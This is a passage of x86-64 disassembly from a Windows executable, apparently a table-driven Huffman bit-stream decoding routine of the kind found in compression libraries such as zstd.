   1400040ba:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400040bf:	90                   	nop
   1400040c0:	41 83 f9 40          	cmp    $0x40,%r9d
   1400040c4:	76 07                	jbe    0x1400040cd
   1400040c6:	ba 03 00 00 00       	mov    $0x3,%edx
   1400040cb:	eb 51                	jmp    0x14000411e
   1400040cd:	49 3b ff             	cmp    %r15,%rdi
   1400040d0:	72 12                	jb     0x1400040e4
   1400040d2:	41 8b c1             	mov    %r9d,%eax
   1400040d5:	41 83 e1 07          	and    $0x7,%r9d
   1400040d9:	48 c1 e8 03          	shr    $0x3,%rax
   1400040dd:	48 2b f8             	sub    %rax,%rdi
   1400040e0:	33 d2                	xor    %edx,%edx
   1400040e2:	eb 37                	jmp    0x14000411b
   1400040e4:	48 3b fd             	cmp    %rbp,%rdi
   1400040e7:	75 0b                	jne    0x1400040f4
   1400040e9:	41 83 f9 40          	cmp    $0x40,%r9d
   1400040ed:	1b d2                	sbb    %edx,%edx
   1400040ef:	83 c2 02             	add    $0x2,%edx
   1400040f2:	eb 2a                	jmp    0x14000411e
   1400040f4:	41 8b c9             	mov    %r9d,%ecx
   1400040f7:	48 8b c7             	mov    %rdi,%rax
   1400040fa:	c1 e9 03             	shr    $0x3,%ecx
   1400040fd:	33 d2                	xor    %edx,%edx
   1400040ff:	48 2b c1             	sub    %rcx,%rax
   140004102:	48 3b c5             	cmp    %rbp,%rax
   140004105:	73 09                	jae    0x140004110
   140004107:	8b cf                	mov    %edi,%ecx
   140004109:	ba 01 00 00 00       	mov    $0x1,%edx
   14000410e:	2b cd                	sub    %ebp,%ecx
   140004110:	8b c1                	mov    %ecx,%eax
   140004112:	48 2b f8             	sub    %rax,%rdi
   140004115:	6b c1 f8             	imul   $0xfffffff8,%ecx,%eax
   140004118:	44 03 c8             	add    %eax,%r9d
   14000411b:	48 8b 37             	mov    (%rdi),%rsi
   14000411e:	33 c9                	xor    %ecx,%ecx
   140004120:	4d 3b dd             	cmp    %r13,%r11
   140004123:	0f 92 c1             	setb   %cl
   140004126:	33 c0                	xor    %eax,%eax
   140004128:	85 d2                	test   %edx,%edx
   14000412a:	0f 94 c0             	sete   %al
   14000412d:	85 c8                	test   %ecx,%eax
   14000412f:	0f 84 b5 00 00 00    	je     0x1400041ea
   140004135:	41 8b c9             	mov    %r9d,%ecx
   140004138:	41 8b dc             	mov    %r12d,%ebx
   14000413b:	f7 db                	neg    %ebx
   14000413d:	48 8b c6             	mov    %rsi,%rax
   140004140:	48 d3 e0             	shl    %cl,%rax
   140004143:	83 e3 3f             	and    $0x3f,%ebx
   140004146:	8b cb                	mov    %ebx,%ecx
   140004148:	48 d3 e8             	shr    %cl,%rax
   14000414b:	49 8d 0c 86          	lea    (%r14,%rax,4),%rcx
   14000414f:	41 0f b7 04 86       	movzwl (%r14,%rax,4),%eax
   140004154:	66 41 89 03          	mov    %ax,(%r11)
   140004158:	48 8b c6             	mov    %rsi,%rax
   14000415b:	0f b6 51 02          	movzbl 0x2(%rcx),%edx
   14000415f:	44 0f b6 41 03       	movzbl 0x3(%rcx),%r8d
   140004164:	41 03 d1             	add    %r9d,%edx
   140004167:	8b ca                	mov    %edx,%ecx
   140004169:	4d 03 c3             	add    %r11,%r8
   14000416c:	48 d3 e0             	shl    %cl,%rax
   14000416f:	8b cb                	mov    %ebx,%ecx
   140004171:	48 d3 e8             	shr    %cl,%rax
   140004174:	49 8d 0c 86          	lea    (%r14,%rax,4),%rcx
   140004178:	41 0f b7 04 86       	movzwl (%r14,%rax,4),%eax
   14000417d:	66 41 89 00          	mov    %ax,(%r8)
   140004181:	48 8b c6             	mov    %rsi,%rax
   140004184:	44 0f b6 49 02       	movzbl 0x2(%rcx),%r9d
   140004189:	44 0f b6 51 03       	movzbl 0x3(%rcx),%r10d
   14000418e:	44 03 ca             	add    %edx,%r9d
   140004191:	41 8b c9             	mov    %r9d,%ecx
   140004194:	4d 03 d0             	add    %r8,%r10
   140004197:	48 d3 e0             	shl    %cl,%rax
   14000419a:	8b cb                	mov    %ebx,%ecx
   14000419c:	48 d3 e8             	shr    %cl,%rax
   14000419f:	49 8d 14 86          	lea    (%r14,%rax,4),%rdx
   1400041a3:	41 0f b7 04 86       	movzwl (%r14,%rax,4),%eax
   1400041a8:	66 41 89 02          	mov    %ax,(%r10)
   1400041ac:	48 8b c6             	mov    %rsi,%rax
   1400041af:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   1400041b4:	0f b6 52 03          	movzbl 0x3(%rdx),%edx
   1400041b8:	45 03 c1             	add    %r9d,%r8d
   1400041bb:	41 8b c8             	mov    %r8d,%ecx
   1400041be:	49 03 d2             	add    %r10,%rdx
   1400041c1:	48 d3 e0             	shl    %cl,%rax
   1400041c4:	8b cb                	mov    %ebx,%ecx
   1400041c6:	48 d3 e8             	shr    %cl,%rax
   1400041c9:	49 8d 0c 86          	lea    (%r14,%rax,4),%rcx
   1400041cd:	41 0f b7 04 86       	movzwl (%r14,%rax,4),%eax
   1400041d2:	66 89 02             	mov    %ax,(%rdx)
   1400041d5:	44 0f b6 49 02       	movzbl 0x2(%rcx),%r9d
   1400041da:	44 0f b6 59 03       	movzbl 0x3(%rcx),%r11d
   1400041df:	45 03 c8             	add    %r8d,%r9d
   1400041e2:	4c 03 da             	add    %rdx,%r11
   1400041e5:	e9 d6 fe ff ff       	jmp    0x1400040c0
   1400041ea:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400041ef:	45 8b c4             	mov    %r12d,%r8d
   1400041f2:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   1400041f7:	41 f7 d8             	neg    %r8d
   1400041fa:	41 83 e0 3f          	and    $0x3f,%r8d
   1400041fe:	4c 8d 53 fe          	lea    -0x2(%rbx),%r10
   140004202:	41 83 f9 40          	cmp    $0x40,%r9d
   140004206:	76 07                	jbe    0x14000420f
   140004208:	ba 03 00 00 00       	mov    $0x3,%edx
   14000420d:	eb 51                	jmp    0x140004260
   14000420f:	49 3b ff             	cmp    %r15,%rdi
   140004212:	72 12                	jb     0x140004226
   140004214:	41 8b c1             	mov    %r9d,%eax
   140004217:	41 83 e1 07          	and    $0x7,%r9d
   14000421b:	48 c1 e8 03          	shr    $0x3,%rax
   14000421f:	48 2b f8             	sub    %rax,%rdi
   140004222:	33 d2                	xor    %edx,%edx
   140004224:	eb 37                	jmp    0x14000425d
   140004226:	48 3b fd             	cmp    %rbp,%rdi
   140004229:	75 0b                	jne    0x140004236
   14000422b:	41 83 f9 40          	cmp    $0x40,%r9d
   14000422f:	1b d2                	sbb    %edx,%edx
   140004231:	83 c2 02             	add    $0x2,%edx
   140004234:	eb 2a                	jmp    0x140004260
   140004236:	41 8b c9             	mov    %r9d,%ecx
   140004239:	48 8b c7             	mov    %rdi,%rax
   14000423c:	c1 e9 03             	shr    $0x3,%ecx
   14000423f:	33 d2                	xor    %edx,%edx
   140004241:	48 2b c1             	sub    %rcx,%rax
   140004244:	48 3b c5             	cmp    %rbp,%rax
   140004247:	73 09                	jae    0x140004252
   140004249:	8b cf                	mov    %edi,%ecx
   14000424b:	ba 01 00 00 00       	mov    $0x1,%edx
   140004250:	2b cd                	sub    %ebp,%ecx
   140004252:	8b c1                	mov    %ecx,%eax
   140004254:	48 2b f8             	sub    %rax,%rdi
   140004257:	6b c1 f8             	imul   $0xfffffff8,%ecx,%eax
   14000425a:	44 03 c8             	add    %eax,%r9d
   14000425d:	48 8b 37             	mov    (%rdi),%rsi
   140004260:	33 c9                	xor    %ecx,%ecx
   140004262:	4d 3b da             	cmp    %r10,%r11
   140004265:	0f 96 c1             	setbe  %cl
   140004268:	33 c0                	xor    %eax,%eax
   14000426a:	85 d2                	test   %edx,%edx
   14000426c:	0f 94 c0             	sete   %al
   14000426f:	85 c8                	test   %ecx,%eax
   140004271:	74 2f                	je     0x1400042a2
   140004273:	41 8b c9             	mov    %r9d,%ecx
   140004276:	48 8b c6             	mov    %rsi,%rax
   140004279:	48 d3 e0             	shl    %cl,%rax
   14000427c:	41 8b c8             	mov    %r8d,%ecx
   14000427f:	48 d3 e8             	shr    %cl,%rax
   140004282:	49 8d 0c 86          	lea    (%r14,%rax,4),%rcx
   140004286:	41 0f b7 04 86       	movzwl (%r14,%rax,4),%eax
   14000428b:	66 41 89 03          	mov    %ax,(%r11)
   14000428f:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   140004293:	44 03 c8             	add    %eax,%r9d
   140004296:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   14000429a:	4c 03 d8             	add    %rax,%r11
   14000429d:	e9 60 ff ff ff       	jmp    0x140004202
   1400042a2:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400042a7:	4d 3b da             	cmp    %r10,%r11
   1400042aa:	77 33                	ja     0x1400042df
   1400042ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400042b0:	41 8b c9             	mov    %r9d,%ecx
   1400042b3:	48 8b c6             	mov    %rsi,%rax
   1400042b6:	48 d3 e0             	shl    %cl,%rax
   1400042b9:	41 8b c8             	mov    %r8d,%ecx
   1400042bc:	48 d3 e8             	shr    %cl,%rax
   1400042bf:	49 8d 0c 86          	lea    (%r14,%rax,4),%rcx
   1400042c3:	41 0f b7 04 86       	movzwl (%r14,%rax,4),%eax
   1400042c8:	66 41 89 03          	mov    %ax,(%r11)
   1400042cc:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   1400042d0:	44 03 c8             	add    %eax,%r9d
   1400042d3:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   1400042d7:	4c 03 d8             	add    %rax,%r11
   1400042da:	4d 3b da             	cmp    %r10,%r11
   1400042dd:	76 d1                	jbe    0x1400042b0
   1400042df:	4c 3b db             	cmp    %rbx,%r11
   1400042e2:	73 4a                	jae    0x14000432e
   1400042e4:	41 f7 dc             	neg    %r12d
   1400042e7:	41 8b c9             	mov    %r9d,%ecx
   1400042ea:	48 d3 e6             	shl    %cl,%rsi
   1400042ed:	41 83 e4 3f          	and    $0x3f,%r12d
   1400042f1:	41 0f b6 cc          	movzbl %r12b,%ecx
   1400042f5:	48 d3 ee             	shr    %cl,%rsi
   1400042f8:	41 0f b6 04 b6       	movzbl (%r14,%rsi,4),%eax
   1400042fd:	41 88 03             	mov    %al,(%r11)
   140004300:	41 80 7c b6 03 01    	cmpb   $0x1,0x3(%r14,%rsi,4)
   140004306:	75 0b                	jne    0x140004313
   140004308:	41 0f b6 44 b6 02    	movzbl 0x2(%r14,%rsi,4),%eax
   14000430e:	44 03 c8             	add    %eax,%r9d
   140004311:	eb 1b                	jmp    0x14000432e
   140004313:	41 83 f9 40          	cmp    $0x40,%r9d
   140004317:	73 15                	jae    0x14000432e
   140004319:	41 0f b6 44 b6 02    	movzbl 0x2(%r14,%rsi,4),%eax
   14000431f:	44 03 c8             	add    %eax,%r9d
   140004322:	b8 40 00 00 00       	mov    $0x40,%eax
   140004327:	44 3b c8             	cmp    %eax,%r9d
   14000432a:	44 0f 47 c8          	cmova  %eax,%r9d
   14000432e:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140004333:	48 3b fd             	cmp    %rbp,%rdi
   140004336:	48 8b bc 24 98 00 00 	mov    0x98(%rsp),%rdi
   14000433d:	00 
   14000433e:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   140004345:	00 
   140004346:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   14000434b:	48 8b b4 24 90 00 00 	mov    0x90(%rsp),%rsi
   140004352:	00 
   140004353:	75 0e                	jne    0x140004363
   140004355:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000435c:	00 
   14000435d:	41 83 f9 40          	cmp    $0x40,%r9d
   140004361:	74 07                	je     0x14000436a
   140004363:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   14000436a:	48 83 c4 70          	add    $0x70,%rsp
   14000436e:	5b                   	pop    %rbx
   14000436f:	c3                   	ret
   140004370:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004375:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000437a:	55                   	push   %rbp
   14000437b:	56                   	push   %rsi
   14000437c:	57                   	push   %rdi
   14000437d:	41 55                	push   %r13
   14000437f:	41 56                	push   %r14
   140004381:	48 8d 6c 24 d0       	lea    -0x30(%rsp),%rbp
   140004386:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   14000438d:	4d 8b f1             	mov    %r9,%r14
   140004390:	49 8b f8             	mov    %r8,%rdi
   140004393:	4c 8b ea             	mov    %rdx,%r13
   140004396:	48 8b f1             	mov    %rcx,%rsi
   140004399:	49 83 f9 0a          	cmp    $0xa,%r9
   14000439d:	73 16                	jae    0x1400043b5
   14000439f:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400043a6:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400043ad:	41 5e                	pop    %r14
   1400043af:	41 5d                	pop    %r13
   1400043b1:	5f                   	pop    %rdi
   1400043b2:	5e                   	pop    %rsi
   1400043b3:	5d                   	pop    %rbp
   1400043b4:	c3                   	ret
   1400043b5:	48 89 9c 24 60 01 00 	mov    %rbx,0x160(%rsp)
   1400043bc:	00 
   1400043bd:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   1400043c1:	48 8b 9d 80 00 00 00 	mov    0x80(%rbp),%rbx
   1400043c8:	48 8b cf             	mov    %rdi,%rcx
   1400043cb:	4c 89 a4 24 28 01 00 	mov    %r12,0x128(%rsp)
   1400043d2:	00 
   1400043d3:	4c 89 bc 24 20 01 00 	mov    %r15,0x120(%rsp)
   1400043da:	00 
   1400043db:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400043df:	e8 3c cd ff ff       	call   0x140001120
   1400043e4:	44 0f b7 f8          	movzwl %ax,%r15d
   1400043e8:	48 8d 4f 02          	lea    0x2(%rdi),%rcx
   1400043ec:	4c 89 7d 00          	mov    %r15,0x0(%rbp)
   1400043f0:	e8 2b cd ff ff       	call   0x140001120
   1400043f5:	44 0f b7 e0          	movzwl %ax,%r12d
   1400043f9:	48 8d 4f 04          	lea    0x4(%rdi),%rcx
   1400043fd:	4c 89 65 08          	mov    %r12,0x8(%rbp)
   140004401:	e8 1a cd ff ff       	call   0x140001120
   140004406:	0f b7 c8             	movzwl %ax,%ecx
   140004409:	48 8d 57 06          	lea    0x6(%rdi),%rdx
   14000440d:	4a 8d 04 3a          	lea    (%rdx,%r15,1),%rax
   140004411:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140004415:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140004419:	4d 8b c6             	mov    %r14,%r8
   14000441c:	49 03 c4             	add    %r12,%rax
   14000441f:	4c 2b c1             	sub    %rcx,%r8
   140004422:	4d 2b c4             	sub    %r12,%r8
   140004425:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004429:	44 0f b6 63 02       	movzbl 0x2(%rbx),%r12d
   14000442e:	49 8d 45 03          	lea    0x3(%r13),%rax
   140004432:	48 c1 e8 02          	shr    $0x2,%rax
   140004436:	4d 2b c7             	sub    %r15,%r8
   140004439:	49 83 c0 fa          	add    $0xfffffffffffffffa,%r8
   14000443d:	44 89 a5 88 00 00 00 	mov    %r12d,0x88(%rbp)
   140004444:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
   140004448:	4c 8d 2c 30          	lea    (%rax,%rsi,1),%r13
   14000444c:	4a 8d 0c 28          	lea    (%rax,%r13,1),%rcx
   140004450:	4c 89 6d d0          	mov    %r13,-0x30(%rbp)
   140004454:	48 03 c1             	add    %rcx,%rax
   140004457:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
   14000445b:	4d 8b fd             	mov    %r13,%r15
   14000445e:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140004462:	4c 8b f1             	mov    %rcx,%r14
   140004465:	48 8b f8             	mov    %rax,%rdi
   140004468:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000446c:	4c 3b 45 78          	cmp    0x78(%rbp),%r8
   140004470:	0f 87 de 03 00 00    	ja     0x140004854
   140004476:	4c 8b 45 00          	mov    0x0(%rbp),%r8
   14000447a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000447f:	e8 ac cc ff ff       	call   0x140001130
   140004484:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140004488:	0f 87 ac 0d 00 00    	ja     0x14000523a
   14000448e:	4c 8b 45 08          	mov    0x8(%rbp),%r8
   140004492:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004497:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000449b:	e8 90 cc ff ff       	call   0x140001130
   1400044a0:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400044a4:	0f 87 90 0d 00 00    	ja     0x14000523a
   1400044aa:	4c 8b 45 e8          	mov    -0x18(%rbp),%r8
   1400044ae:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400044b3:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400044b7:	e8 74 cc ff ff       	call   0x140001130
   1400044bc:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400044c0:	0f 87 74 0d 00 00    	ja     0x14000523a
   1400044c6:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400044ca:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   1400044ce:	48 03 55 e8          	add    -0x18(%rbp),%rdx
   1400044d2:	4c 8b 45 e0          	mov    -0x20(%rbp),%r8
   1400044d6:	e8 55 cc ff ff       	call   0x140001130
   1400044db:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400044df:	0f 87 55 0d 00 00    	ja     0x14000523a
   1400044e5:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400044e9:	48 8b c7             	mov    %rdi,%rax
   1400044ec:	48 83 c1 f9          	add    $0xfffffffffffffff9,%rcx
   1400044f0:	48 3b c1             	cmp    %rcx,%rax
   1400044f3:	0f 83 4b 03 00 00    	jae    0x140004844
   1400044f9:	45 8b ec             	mov    %r12d,%r13d
   1400044fc:	41 f7 dc             	neg    %r12d
   1400044ff:	41 f7 dd             	neg    %r13d
   140004502:	41 83 e5 3f          	and    $0x3f,%r13d
   140004506:	41 83 e4 3f          	and    $0x3f,%r12d
   14000450a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004510:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004514:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004519:	48 d3 e0             	shl    %cl,%rax
   14000451c:	41 8b cd             	mov    %r13d,%ecx
   14000451f:	48 d3 e8             	shr    %cl,%rax
   140004522:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004526:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000452b:	66 89 06             	mov    %ax,(%rsi)
   14000452e:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004532:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004536:	0f b6 51 07          	movzbl 0x7(%rcx),%edx
   14000453a:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000453e:	48 03 d6             	add    %rsi,%rdx
   140004541:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004546:	48 d3 e0             	shl    %cl,%rax
   140004549:	41 8b cd             	mov    %r13d,%ecx
   14000454c:	48 d3 e8             	shr    %cl,%rax
   14000454f:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004553:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004558:	66 41 89 07          	mov    %ax,(%r15)
   14000455c:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004560:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004564:	44 0f b6 41 07       	movzbl 0x7(%rcx),%r8d
   140004569:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000456d:	4d 03 c7             	add    %r15,%r8
   140004570:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004575:	48 d3 e0             	shl    %cl,%rax
   140004578:	41 8b cd             	mov    %r13d,%ecx
   14000457b:	48 d3 e8             	shr    %cl,%rax
   14000457e:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004582:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004587:	66 41 89 06          	mov    %ax,(%r14)
   14000458b:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   14000458f:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004593:	44 0f b6 49 07       	movzbl 0x7(%rcx),%r9d
   140004598:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   14000459b:	4d 03 ce             	add    %r14,%r9
   14000459e:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   1400045a2:	48 d3 e0             	shl    %cl,%rax
   1400045a5:	41 8b cd             	mov    %r13d,%ecx
   1400045a8:	48 d3 e8             	shr    %cl,%rax
   1400045ab:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   1400045af:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400045b4:	66 89 07             	mov    %ax,(%rdi)
   1400045b7:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400045bb:	01 45 a0             	add    %eax,-0x60(%rbp)
   1400045be:	44 0f b6 51 07       	movzbl 0x7(%rcx),%r10d
   1400045c3:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400045c7:	4c 03 d7             	add    %rdi,%r10
   1400045ca:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400045cf:	48 d3 e0             	shl    %cl,%rax
   1400045d2:	41 8b cc             	mov    %r12d,%ecx
   1400045d5:	48 d3 e8             	shr    %cl,%rax
   1400045d8:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   1400045dc:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400045e1:	66 89 02             	mov    %ax,(%rdx)
   1400045e4:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400045e8:	01 44 24 28          	add    %eax,0x28(%rsp)
   1400045ec:	44 0f b6 59 07       	movzbl 0x7(%rcx),%r11d
   1400045f1:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400045f5:	4c 03 da             	add    %rdx,%r11
   1400045f8:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400045fd:	48 d3 e0             	shl    %cl,%rax
   140004600:	41 8b cc             	mov    %r12d,%ecx
   140004603:	48 d3 e8             	shr    %cl,%rax
   140004606:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   14000460a:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000460f:	66 41 89 00          	mov    %ax,(%r8)
   140004613:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004617:	01 44 24 50          	add    %eax,0x50(%rsp)
   14000461b:	0f b6 51 07          	movzbl 0x7(%rcx),%edx
   14000461f:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004623:	49 03 d0             	add    %r8,%rdx
   140004626:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000462b:	48 d3 e0             	shl    %cl,%rax
   14000462e:	41 8b cc             	mov    %r12d,%ecx
   140004631:	48 d3 e8             	shr    %cl,%rax
   140004634:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004638:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000463d:	66 41 89 01          	mov    %ax,(%r9)
   140004641:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004645:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004649:	44 0f b6 41 07       	movzbl 0x7(%rcx),%r8d
   14000464e:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004651:	4d 03 c1             	add    %r9,%r8
   140004654:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   140004658:	48 d3 e0             	shl    %cl,%rax
   14000465b:	41 8b cc             	mov    %r12d,%ecx
   14000465e:	48 d3 e8             	shr    %cl,%rax
   140004661:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004665:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000466a:	66 41 89 02          	mov    %ax,(%r10)
   14000466e:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004672:	01 45 a0             	add    %eax,-0x60(%rbp)
   140004675:	44 0f b6 49 07       	movzbl 0x7(%rcx),%r9d
   14000467a:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   14000467e:	4d 03 ca             	add    %r10,%r9
   140004681:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004686:	48 d3 e0             	shl    %cl,%rax
   140004689:	41 8b cc             	mov    %r12d,%ecx
   14000468c:	48 d3 e8             	shr    %cl,%rax
   14000468f:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004693:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004698:	66 41 89 03          	mov    %ax,(%r11)
   14000469c:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400046a0:	01 44 24 28          	add    %eax,0x28(%rsp)
   1400046a4:	44 0f b6 51 07       	movzbl 0x7(%rcx),%r10d
   1400046a9:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400046ad:	4d 03 d3             	add    %r11,%r10
   1400046b0:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400046b5:	48 d3 e0             	shl    %cl,%rax
   1400046b8:	41 8b cc             	mov    %r12d,%ecx
   1400046bb:	48 d3 e8             	shr    %cl,%rax
   1400046be:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   1400046c2:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400046c7:	66 89 02             	mov    %ax,(%rdx)
   1400046ca:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400046ce:	01 44 24 50          	add    %eax,0x50(%rsp)
   1400046d2:	44 0f b6 59 07       	movzbl 0x7(%rcx),%r11d
   1400046d7:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   1400046db:	4c 03 da             	add    %rdx,%r11
   1400046de:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400046e3:	48 d3 e0             	shl    %cl,%rax
   1400046e6:	41 8b cc             	mov    %r12d,%ecx
   1400046e9:	48 d3 e8             	shr    %cl,%rax
   1400046ec:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   1400046f0:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400046f5:	66 41 89 00          	mov    %ax,(%r8)
   1400046f9:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400046fd:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004701:	0f b6 51 07          	movzbl 0x7(%rcx),%edx
   140004705:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004708:	49 03 d0             	add    %r8,%rdx
   14000470b:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   14000470f:	48 d3 e0             	shl    %cl,%rax
   140004712:	41 8b cd             	mov    %r13d,%ecx
   140004715:	48 d3 e8             	shr    %cl,%rax
   140004718:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   14000471c:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004721:	66 41 89 01          	mov    %ax,(%r9)
   140004725:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004729:	01 45 a0             	add    %eax,-0x60(%rbp)
   14000472c:	44 0f b6 41 07       	movzbl 0x7(%rcx),%r8d
   140004731:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004735:	4d 03 c1             	add    %r9,%r8
   140004738:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000473d:	48 d3 e0             	shl    %cl,%rax
   140004740:	41 8b cd             	mov    %r13d,%ecx
   140004743:	48 d3 e8             	shr    %cl,%rax
   140004746:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   14000474a:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000474f:	66 41 89 02          	mov    %ax,(%r10)
   140004753:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004757:	0f b6 71 07          	movzbl 0x7(%rcx),%esi
   14000475b:	01 44 24 28          	add    %eax,0x28(%rsp)
   14000475f:	49 03 f2             	add    %r10,%rsi
   140004762:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004766:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000476b:	48 d3 e0             	shl    %cl,%rax
   14000476e:	41 8b cd             	mov    %r13d,%ecx
   140004771:	48 d3 e8             	shr    %cl,%rax
   140004774:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004778:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   14000477c:	66 41 89 03          	mov    %ax,(%r11)
   140004780:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004784:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004788:	44 0f b6 79 07       	movzbl 0x7(%rcx),%r15d
   14000478d:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004791:	4d 03 fb             	add    %r11,%r15
   140004794:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004799:	48 d3 e0             	shl    %cl,%rax
   14000479c:	41 8b cd             	mov    %r13d,%ecx
   14000479f:	48 d3 e8             	shr    %cl,%rax
   1400047a2:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
